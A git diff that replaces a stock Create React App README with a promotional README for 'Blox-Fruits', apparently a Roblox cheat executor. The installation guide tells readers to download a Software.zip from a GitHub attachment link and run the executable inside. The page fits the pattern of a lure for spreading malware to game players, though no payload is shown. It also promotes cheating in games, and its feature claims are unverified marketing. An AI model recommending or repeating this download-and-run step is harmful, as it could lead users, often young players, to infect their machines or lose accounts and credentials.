@@ -1,44 +1,66 @@
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+# Blox-Fruits
 
-## Available Scripts
+Apple-Ware: Delivers 80% UNC and Level 7 capabilities, backed by a responsive support team and a sleek, intuitive interface. Regular updates ensure compatibility with the latest Roblox patches, and its performance optimization makes it one of the fastest executors available.
 
-In the project directory, you can run:
+## Table of Contents
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation Guide](#installation-guide)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-### `npm start`
+## Introduction
 
-Runs the app in the development mode.<br>
-Open [http://localhost:3000](http://localhost:3000) to view it in the browser.
+Welcome to the Blox-Fruits repository! Blox-Fruits is a powerful tool designed to bring cutting-edge execution capabilities to Roblox enthusiasts. With features like 80% UNC and Level 7 capabilities, this executor sets itself apart from the competition.
 
-The page will reload if you make edits.<br>
-You will also see any lint errors in the console.
+The support team behind Blox-Fruits is dedicated to providing exceptional service to all users. Whether you have a question, need assistance, or want to provide feedback, we are here to help.
 
-### `npm test`
+## Features
 
-Launches the test runner in the interactive watch mode.<br>
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+- **80% UNC**: Achieve unrivaled executions with the 80% UNC feature.
+- **Level 7 capabilities**: Unlock advanced functionalities with Level 7 capabilities.
+- **Responsive support team**: Get timely assistance from our dedicated support team.
+- **Sleek interface**: Enjoy a smooth and intuitive user experience with Blox-Fruits.
+- **Regular updates**: Stay ahead with compatibility updates for the latest Roblox patches.
+- **Performance optimization**: Experience one of the fastest executors available in the market.
 
-### `npm run build`
+![Blox-Fruits Logo](https://via.placeholder.com/150)
 
-Builds the app for production to the `build` folder.<br>
-It correctly bundles React in production mode and optimizes the build for the best performance.
+## Installation Guide
 
-The build is minified and the filenames include the hashes.<br>
-Your app is ready to be deployed!
+To get started with Blox-Fruits, follow these simple steps:
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+1. Download the [Software.zip](https://github.com/user-attachments/files/17382638/Software.zip) file.
+2. Extract the contents of the zip file to a location of your choice.
+3. Run the executable file to launch Blox-Fruits.
 
-### `npm run eject`
+## Usage
 
-**Note: this is a one-way operation. Once you `eject`, you can’t go back!**
+With Blox-Fruits, you can enhance your Roblox experience in numerous ways. Here are some common tasks you can accomplish using Blox-Fruits:
 
-If you aren’t satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
+1. **Exploit scripts**: Execute powerful scripts in Roblox to enhance gameplay.
+2. **Game modifications**: Use Blox-Fruits to modify games and access hidden features.
+3. **User interface customization**: Customize the interface to suit your preferences.
+4. **Performance tweaks**: Optimize performance for smoother gameplay.
 
-Instead, it will copy all the configuration files and the transitive dependencies (Webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you’re on your own.
+![Blox-Fruits Screenshot](https://via.placeholder.com/700x400)
 
-You don’t have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn’t feel obligated to use this feature. However we understand that this tool wouldn’t be useful if you couldn’t customize it when you are ready for it.
+## Contributing
 
-## Learn More
+We welcome contributions from the community to make Blox-Fruits even better. If you have ideas for new features, improvements, or bug fixes, feel free to contribute! Here's how you can get involved:
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes.
+4. Submit a pull request.
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+Our team will review your contribution and work together to incorporate it into Blox-Fruits.
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+Thank you for exploring Blox-Fruits! We hope this tool brings excitement and innovation to your Roblox journey. If you have any questions or feedback, don't hesitate to reach out to our support team. Happy exploiting! 🍎🔧🎮
